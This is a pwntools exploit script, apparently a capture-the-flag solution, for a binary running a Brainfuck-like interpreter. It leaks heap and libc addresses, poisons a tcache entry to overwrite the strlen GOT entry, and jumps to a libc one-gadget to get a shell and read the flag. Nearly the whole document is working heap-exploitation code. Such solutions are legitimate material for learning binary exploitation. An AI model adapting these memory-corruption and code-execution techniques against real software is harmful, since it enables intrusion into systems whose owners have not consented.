from pwn import *

# Set up pwntools for the correct architecture
exe = "./challenge"
libc = ELF("libc.so.6")
context.binary = elf = ELF(exe)
# context.log_level = "error"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("", )
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    set max-visualize-chunk-size 0x500
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def rls(a): return r.recvlines(a)
def i(): return r.interactive()

payload = b""

def incptr(num):
    global payload
    payload += num*b">"

def decptr(num):
    global payload
    payload += num*b"<"

def incval(num):
    global payload
    payload += num*b"+"

def decval(num):
    global payload
    payload += num*b"-"

def showval(num):
    global payload
    payload += num*b".>"

def putval(num):
    global payload
    payload += num*b",>"

def leak8():
    global payload
    payload += 8*b">." + 8*b"<"

def call():
    global payload
    sla(b">> ",b"1")
    sla(b"(y/n) ? ",b"n")
    sla(b": ", payload)

def reset():
    global payload
    payload = b""

r = start()

# stage 1 - heap and libc leaks
incptr(24)
payload += (0x3000-len(payload))*b"\x00"
showval(16)
incptr(8)
putval(1)
call()
sl(b"\x00")

libc.address = u64(rl()[-9:-3].ljust(8, b"\x00")) - 2092288
log.info(f"libc: {hex(libc.address)}")
strlen_got = libc.address + 2089088
rl()
# stage 2 - overwrite the tcache entry for 0x50
payload += b"+[<<<<<<<<<<<<<<<<<<<<<<<<,]>>>>>>>"
putval(8)
decptr(284+8)
putval(1)
incptr(284+8)
putval(288)
call()
for i in "\x01"*3186:
    sl(i.encode())
sl(b"\x00")

for i in p64(strlen_got):
    sl(bytes([i]))

sl(b"\x01")

for i in "\x00"*288:
    sl(i.encode())
sl(b"\x00")

payload = p64(libc.address + 0x110612) + b"A"*(0x1c0-8) # works
call()

sl(b"cat flag.txt")

r.interactive()
